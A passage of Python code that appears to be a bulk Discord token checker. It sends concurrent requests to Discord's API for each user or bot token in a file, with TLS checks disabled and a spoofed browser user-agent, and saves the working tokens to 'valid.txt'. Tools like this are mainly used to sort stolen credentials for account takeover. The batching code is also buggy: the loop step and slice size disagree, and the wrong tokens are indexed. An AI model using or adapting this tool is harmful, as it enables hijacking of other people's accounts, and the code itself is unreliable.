        rm = RequestMaker(headers={'content-type':'application/json', 'user-agent':'Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0'}, connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True)
        if len(tokens) > 2000:
            async with rm:
                for i in range(0, len(tokens), 100):
                    resp = await rm.request_pool([{"method":"get", "url":"https://discord.com/api/v9/users/@me/library", "headers":{"authorization":f"{token}"}}for token in tokens[i:i+500]])
                    resp = await rm.response_pool_status_sync(resp)
                    for index, status in enumerate(resp):
                        async with aiofiles.open('valid.txt', 'a') as f:
                            if status == 200:
                                await aprint(f"{color.GREEN}Token number {index+1} is fully working user token! --- {tokens[index]}{color.RESET}")
                                await f.write(f"{tokens[index]}\n")
                            elif status == 403:
                                await aprint(f"{color.RED}Token number {index+1} is account locked in some way{color.RESET}")
                            elif status == 429:
                                await aprint(f"{color.RED}Token number {index+1} check was incomplete, ratelimited{color.RESET}")
                            elif status == 401:
                                await aprint(f"{color.RED}Token number {index+1} is invalid!{color.RESET}")
                            else:
                                await aprint(f"{color.RED}Black magic occurred -- {status} -- {index+1}{color.RESET}")


        else:
            async with rm:
                resp = await rm.request_pool([{"method":"get", "url":"https://discord.com/api/v9/users/@me/library", "headers":{"authorization":f"{token}"}}for token in tokens])

            # print(results)
            resp = await rm.response_pool_status_sync(resp)
            for index, status in enumerate(resp):
                async with aiofiles.open('valid.txt', 'a') as f:
                    if status == 200:
                        await aprint(f"{color.GREEN}Token number {index+1} is fully working user token! --- {tokens[index]}{color.RESET}")
                        await f.write(f"{tokens[index]}\n")
                    elif status == 403:
                        await aprint(f"{color.RED}Token number {index+1} is account locked in some way{color.RESET}")
                    elif status == 429:
                        await aprint(f"{color.RED}Token number {index+1} check was incomplete, ratelimited{color.RESET}")
                    elif status == 401:
                        await aprint(f"{color.RED}Token number {index+1} is invalid!{color.RESET}")
                    else:
                        await aprint(f"{color.RED}Black magic occurred -- {status} -- {index+1}{color.RESET}")

    async def bot_check(self):
        tokens = open('tokens.txt', 'r').read().splitlines()

        rm = RequestMaker(headers={'content-type':'application/json', 'user-agent':'Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0'}, connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True)
        if len(tokens) > 2000:
            async with rm:
                for i in range(0, len(tokens), 500):
                    resp = await rm.request_pool([{"method":"get", "url":'https://canary.discordapp.com/api/v9/users/@me', "headers":{"authorization": f'Bot {token}'}}for token in tokens[i:i+500]])
                    resp = await rm.response_pool_status_sync(resp)
                    for index, status in enumerate(resp):
                        async with aiofiles.open('valid.txt', 'a') as f:
                            if status == 200:
                                await aprint(f"{color.GREEN}Token number {index+1} is fully working bot token! --- {tokens[index]}{color.RESET}")
                                await f.write(f"{tokens[index]}\n")
                            elif status == 403:
                                await aprint(f"{color.RED}Token number {index+1} is account locked in some way{color.RESET}")
                            elif status == 429:
                                await aprint(f"{color.RED}Token number {index+1} check was incomplete, ratelimited{color.RESET}")
                            elif status == 401:
                                await aprint(f"{color.RED}Token number {index+1} is invalid!{color.RESET}")
                            else:
                                await aprint(f"{color.RED}Black magic occurred -- {status} -- {index+1}{color.RESET}")

        else:
            async with rm:
                resp = await rm.request_pool([{"method":"get", "url":'https://canary.discordapp.com/api/v9/users/@me', "headers":{"Authorization": f'Bot {token}'}}for token in tokens])

            # print(results)
            resp = await rm.response_pool_status_sync(resp)
            for index, status in enumerate(resp):
                async with aiofiles.open('valid.txt', 'a+') as f:
                    if status == 200:
                        await aprint(f"{color.GREEN}Token number {index+1} is fully working bot token! --- {tokens[index]}{color.RESET}")
                        await f.write(f"{tokens[index]}\n")
                    elif status == 403:
                        await aprint(f"{color.RED}Token number {index+1} is account locked in some way{color.RESET}")
                    elif status == 429:
                        await aprint(f"{color.RED}Token number {index+1} check was incomplete, ratelimited{color.RESET}")
                    elif status == 401:
                        await aprint(f"{color.RED}Token number {index+1} is invalid!{color.RESET}")
                    else:
                        await aprint(f"{color.RED}Black magic occurred -- {status} -- {index+1}{color.RESET}")

















